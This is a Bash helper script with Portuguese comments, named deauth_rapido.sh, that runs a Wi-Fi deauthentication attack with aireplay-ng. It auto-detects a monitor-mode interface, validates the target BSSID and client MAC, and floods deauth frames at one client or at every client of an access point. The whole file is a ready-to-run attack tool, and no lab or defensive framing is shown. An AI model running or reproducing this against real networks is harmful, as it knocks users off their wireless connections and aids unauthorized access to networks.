#!/bin/bash

################################################################################
# Script auxiliar para executar ataque deauth rapidamente
# Uso: sudo ./deauth_rapido.sh [BSSID] [INTERFACE] [CLIENT_MAC] [COUNT]
# Se INTERFACE não for informada, o script tentará detectar automaticamente
################################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Verificar root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Execute como root (sudo)${NC}"
    exit 1
fi

# Função para detectar interface monitor automaticamente
detect_monitor_interface() {
    local monitor_iface=""
    
    # Método 1: Verificar interfaces em modo monitor
    local all_interfaces=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^$' | grep -v 'lo')
    
    for iface in $all_interfaces; do
        if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
            monitor_iface="$iface"
            break
        fi
    done
    
    echo "$monitor_iface"
}

# Função para validar MAC address
validate_mac() {
    local mac="$1"
    if [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
        return 0
    fi
    return 1
}

# Função para validar interface
validate_interface() {
    local iface="$1"
    if iwconfig "$iface" &> /dev/null; then
        if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
            return 0
        else
            echo -e "${RED}[!] Interface $iface não está em modo monitor${NC}"
            return 1
        fi
    else
        echo -e "${RED}[!] Interface $iface não existe${NC}"
        return 1
    fi
}

# Parâmetros
BSSID="$1"
INTERFACE="$2"
CLIENT_MAC="$3"
DEAUTH_COUNT="${4:-10}"

# Verificar BSSID
if [[ -z "$BSSID" ]]; then
    echo -e "${RED}[!] BSSID é obrigatório${NC}"
    echo -e "${YELLOW}Uso: sudo ./deauth_rapido.sh [BSSID] [INTERFACE] [CLIENT_MAC] [COUNT]${NC}"
    echo -e "${YELLOW}Exemplo: sudo ./deauth_rapido.sh 34:CE:00:7F:91:E0 wlan0mon FF:EE:DD:CC:BB:AA 10${NC}"
    exit 1
fi

# Validar formato do BSSID
if ! validate_mac "$BSSID"; then
    echo -e "${RED}[!] BSSID inválido: $BSSID${NC}"
    echo -e "${YELLOW}[*] Formato esperado: XX:XX:XX:XX:XX:XX${NC}"
    exit 1
fi

# Validar CLIENT_MAC se fornecido
if [[ -n "$CLIENT_MAC" ]] && ! validate_mac "$CLIENT_MAC"; then
    echo -e "${RED}[!] MAC do cliente inválido: $CLIENT_MAC${NC}"
    exit 1
fi

# Detectar interface monitor se não fornecida
if [[ -z "$INTERFACE" ]]; then
    echo -e "${BLUE}[*] Interface não informada, tentando detectar automaticamente...${NC}"
    INTERFACE=$(detect_monitor_interface)
    
    if [[ -z "$INTERFACE" ]]; then
        echo -e "${RED}[!] Nenhuma interface monitor encontrada${NC}"
        echo -e "${YELLOW}[*] Interfaces disponíveis:${NC}"
        iwconfig 2>/dev/null | grep -E "^[a-z]|Mode:"
        echo ""
        echo -e "${YELLOW}[*] Por favor, informe a interface monitor manualmente:${NC}"
        echo -e "${CYAN}Uso: sudo ./deauth_rapido.sh $BSSID [INTERFACE]${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] Interface monitor detectada: $INTERFACE${NC}"
    fi
fi

# Validar interface
if ! validate_interface "$INTERFACE"; then
    echo -e "${YELLOW}[*] Tentando detectar interface monitor automaticamente...${NC}"
    INTERFACE=$(detect_monitor_interface)
    
    if [[ -z "$INTERFACE" ]] || ! validate_interface "$INTERFACE"; then
        echo -e "${RED}[!] Não foi possível encontrar uma interface monitor válida${NC}"
        echo -e "${YELLOW}[*] Interfaces disponíveis:${NC}"
        iwconfig 2>/dev/null | grep -E "^[a-z]|Mode:"
        exit 1
    fi
fi

# Confirmar interface
echo -e "${GREEN}[+] Usando interface: $INTERFACE${NC}"
iwconfig "$INTERFACE" | grep -i mode

# Construir e executar comando
echo ""
if [[ -n "$CLIENT_MAC" ]]; then
    echo -e "${BLUE}[*] Atacando cliente específico: $CLIENT_MAC${NC}"
    echo -e "${GREEN}[+] Executando deauth...${NC}"
    echo -e "${CYAN}Comando: aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT_MAC $INTERFACE${NC}\n"
    aireplay-ng --deauth $DEAUTH_COUNT -a "$BSSID" -c "$CLIENT_MAC" "$INTERFACE"
else
    echo -e "${YELLOW}[*] Atacando todos os clientes do AP${NC}"
    echo -e "${GREEN}[+] Executando deauth...${NC}"
    echo -e "${CYAN}Comando: aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID $INTERFACE${NC}\n"
    aireplay-ng --deauth $DEAUTH_COUNT -a "$BSSID" "$INTERFACE"
fi

